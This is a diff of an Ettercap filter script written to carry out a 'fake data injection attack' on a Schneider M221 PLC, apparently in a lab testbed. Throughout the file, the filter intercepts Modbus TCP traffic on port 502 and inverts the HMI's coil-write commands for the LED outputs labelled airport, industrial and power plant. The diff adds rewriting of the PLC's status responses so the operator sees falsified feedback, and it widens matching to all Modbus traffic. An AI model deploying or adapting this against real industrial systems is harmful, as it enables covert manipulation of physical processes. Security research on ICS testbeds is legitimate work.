@@ -2,7 +2,7 @@
 # Name:        m221_1 filter
 #
 # Purpose:     This filter is used to do the fake data injection attack for the 
-#              Schneider m221 PLC system.[PLC0: 192.168.10.72<-> 192.168.10.21]
+#              Schneider m221 PLC system.(IP 192.168.10.72)<-> 192.168.10.21
 # Author:      Yuancheng Liu
 #
 # Created:     2019/09/09
@@ -11,16 +11,19 @@
 #-----------------------------------------------------------------------------
 
 #Reverse the memory change signal from HMI to PLC.
-if (ip.proto == TCP  && tcp.dst == 502 && ip.dst == '192.168.10.72') {
-
+if (ip.proto == TCP  && tcp.dst == 502) {
+    #msg("find the control cmd");
     # M10 -> Q0.0 Airport LED
     if (search(DATA.data ,"\x0f\x00\x0a\x00\x01\x01\x00")) {
         replace("\x0f\x00\x0a\x00\x01\x01\x00", "\x0f\x00\x0a\x00\x01\x01\x01");
         msg("Reverse Airport LED off request.\n");
+        exit();
     }
+
     if (search(DATA.data ,"\x0f\x00\x0a\x00\x01\x01\x01")) {
         replace("\x0f\x00\x0a\x00\x01\x01\x01", "\x0f\x00\x0a\x00\x01\x01\x00");
         msg("Reverse Airport LED on request.\n");
+        exit();
     }
 
     # M60 -> Q0.2 Industrial LED
@@ -37,29 +40,65 @@ if (ip.proto == TCP  && tcp.dst == 502 && ip.dst == '192.168.10.72') {
     # M0 -> Q0.1 Power Plant
     if (search(DATA.data ,"\x0f\x00\x00\x00\x01\x01\x00")) {
         replace("\x0f\x00\x00\x00\x01\x01\x00", "\x0f\x00\x00\x00\x01\x01\x01");
-        msg("Reverse Power Plant LED off request.\n");
+        msg("Power Plant LED off request.\n");
     }
 
     if (search(DATA.data ,"\x0f\x00\x00\x00\x01\x01\x01")) {
         replace("\x0f\x00\x00\x00\x01\x01\x01", "\x0f\x00\x00\x00\x01\x01\x00");
-        msg("Reverse Power Plant LED off request.\n");
+        msg("Power Plant LED off request.\n");
     }
-}
 
-# Drop the memory change signal from HMI to PLC.
-if (ip.proto == TCP  && tcp.dst == 502 && ip.dst == '192.168.10.72')  {
-    # Drop the PLC response.
-    if (search(DATA.data ,"\x00\x00\x00\x00\x00\x08\x01\x01")) {
-        drop();
-        msg("Drop the read request!\n");
+    #if (search(DATA.data ,"\x01\x00\x00\x00\x3d")) {
+    #    drop();
+    #    #msg("in filter");
+    #    log(DATA.data, "/home/pi/scada/log.txt");
+    #	exit();
+    #}
+
+    if (search(DATA.data ,"\x01\x08\x00\x00\x00\x40\x00")) {
+        replace("\x01\x08\x00\x00\x00\x40\x00", "\x01\x08\x00\x04\x00\x40\x00");
+        msg(">Reverse Airport LED off feedback.\n");
+        exit();
     }
-}
+
+
+    if (search(DATA.data ,"\x01\x08\x00\x04\x00\x40\x00")) {
+        replace("\x01\x08\x00\x04\x00\x40\x00", "\x01\x08\x00\x00\x00\x40\x00");
+        msg(">Reverse Airport LED off feedback.\n");
+        exit();
+    }
+
+
+}else{
 
 #Reverse the PLC response to HMI.
-if (ip.proto == TCP && tcp.dst == 502 && ip.dst == '192.168.10.21') {
+if (ip.proto == TCP  && tcp.src == 502) {
     # Drop the PLC response.
-    if (search(DATA.data ,"\x01\x08\")) {
-        drop();
-        msg("Drop the response!\n");
+    #msg("xxxxxxxxx");
+
+    if (DATA.data+6 == "\x01" && DATA.data+7 == "\x01" && DATA.data+8 == "\x08" ) {
+	msg("find the match ");
+        #replace("\x01\x08\x00\x00\x00\x40\x00", "\x01\x08\x00\x04\x00\x40\x00");
+	if (DATA.data+10 == "\x00"){
+		DATA.data+10 = "\x04";
+	}
+	else{
+		DATA.data+10 = "\x00";
+	}
+        exit();
     }
+
+
+    #if (search(DATA.data ,"\x01\x08\x00\x00\x00\x40\x00")) {
+    #    replace("\x01\x08\x00\x00\x00\x40\x00", "\x01\x08\x00\x04\x00\x40\x00");
+    #    msg(">Reverse Airport LED off feedback.\n");
+    #    exit();
+    #}
+
+    #if (search(DATA.data ,"\x01\x08\x00\x04\x00\x40\x00")) {
+    #    replace("\x01\x08\x00\x04\x00\x40\x00", "\x01\x08\x00\x00\x00\x40\x00");
+    #    msg(">Reverse Airport LED off feedback.\n");
+    #    exit();
+    #}
+}
 }
